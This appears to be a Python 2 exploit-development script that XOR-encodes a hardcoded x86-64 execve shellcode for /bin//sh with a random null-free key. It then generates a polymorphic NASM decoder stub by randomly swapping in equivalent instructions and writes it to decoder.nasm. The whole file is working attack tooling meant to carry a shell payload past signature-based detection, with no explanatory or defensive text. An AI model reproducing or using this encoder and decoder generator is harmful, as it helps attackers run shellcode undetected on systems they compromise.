#!/usr/bin/python
from random import randint

encoded = ""
encoded2 = ""

bad_chars = [0x00]

shellcode = ("\x90" + "\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x54\x5e\x57\x54\x5a\x0f\x05")

def valid(byte):
    for ch in bad_chars:
        if ch == byte:
            return False
    return True

valid_R = False
while not valid_R:
    R = randint(0,2**8-1)
    print
    print "random generated number (key): 0x%02x" %R
    valid_R = True
    for x in bytearray(shellcode):
    	# XOR Encoding
	y = x ^ R
        if not valid(y):
            valid_R = False
            encoded = ""
            encoded2 = ""
            break
	encoded += "\\x"
	encoded += "%02x" %y
	encoded2 += "0x"
	encoded2 += "%02x," %y
encoded2 = encoded2[0:-1] # the [0:-1] is just to remove the "," at the end
print "Encoded shellcode ..."
print encoded
print encoded2
print
print "Len: %d" % len(bytearray(shellcode))
print

tab = "   "
poly_db = { "pop rdi":
                [tab+"pop rdi\n",
                 tab+"mov rdi,[rsp]\n"+tab+"add rsp,8\n"],
            "push <param1>|pop <param2>":
                [tab+"push <param1>\n"+tab+"pop <param2>\n",
                 tab+"mov <param2>,<param1>\n"],
            "mov byte dl,[rdi]":
                [tab+"mov byte dl,[rdi]\n",
                 tab+"mov r9,rdi\n"+tab+"mov byte dl,[r9]\n"],
            "xor rdi,rdi":
                [tab+"xor rdi,rdi\n",
                 tab+"sub rdi,rdi\n"],
            "inc rdi":
                [tab+"inc rdi\n",
                 tab+"dec rdi\n"+tab+"add rdi,2\n"],
            "mov byte <param1>,byte <param2>":
                [tab+"mov <param1>,<param2>\n",
                 tab+"mov r9b,<param2>\n"+tab+"mov <param1>,r9b\n"],
            "xor al,dil":
                [tab+"xor al,dil\n",
                 tab+"mov r9b,dil\n"+tab+"xor al,r9b\n"],
            "cmp al,0x90":
                [tab+"cmp al,0x90\n",
                 tab+"mov ah,0xff\n"+tab+"cmp ax,0xff90\n"],
            "push <number>|pop <param2>":
                [tab+"push <param1>\n"+tab+"pop <param2>\n",
                 tab+"xor <param2>,<param2>\n"+tab+"add <param2>,<param1>\n"],
            "xor byte [rdi],al":
                [tab+"xor byte [rdi],al\n",
                 tab+"mov byte r9b,[rdi]\n"+tab+"xor r9b,al\n"+tab+"mov byte [rdi],r9b\n"],
            "loop decode":
                [tab+"loop decode\n",
                 tab+"dec rcx\n"+tab+"xor r9,r9\n"+tab+"cmp r9,rcx\n"+tab+"jne decode\n"]
        }
def poly(instruction,param1="",param2="",param3=""):
    options = poly_db[instruction]
    r = randint(0,len(options)-1)
    str = options[r]
    str = str.replace("<param1>",param1)
    str = str.replace("<param2>",param2)
    str = str.replace("<param3>",param3)
    return str

code =  "global _start \n"
code += "\n"
code += "section .text\n"
code += "\n"
code += "_start:\n"
code += "   jmp short find_address\n"
code += "decoder:\n"
code += "   ; Get the address of the string \n"
code +=     poly("pop rdi")
code +=     poly("push <param1>|pop <param2>","rdi","rbx")
code += "\n"
code += "   ; get the first byte and bruteforce till you get the token 0x90\n"

code +=     poly("mov byte dl,[rdi]")
code +=     poly("xor rdi,rdi") # key that will be incremented from 0x00 to 0xff
code += "bruteforce:\n"
code +=     poly("inc rdi")
code +=     poly("mov byte <param1>,byte <param2>","al","dl")
code +=     poly("xor al,dil")
code +=     poly("cmp al,0x90")
code += "   jne bruteforce\n"
code += "\n"
code +=     poly("push <number>|pop <param2>",str(len(bytearray(shellcode))),"rcx")
code +=     poly("mov byte <param1>,byte <param2>","al","dil")
code +=     poly("push <param1>|pop <param2>","rbx","rdi")
code += "decode:\n"
code +=     poly("xor byte [rdi],al")
code +=     poly("inc rdi")
code +=     poly("loop decode")
code += "\n"
code += "   jmp rbx\n" # jmp to decoded shellcode
code += "   \n"
code += "find_address:\n"
code += "   call decoder\n"
code += "   encoded db " + encoded2 + "\n"

fout = open("decoder.nasm","w")
fout.write(code)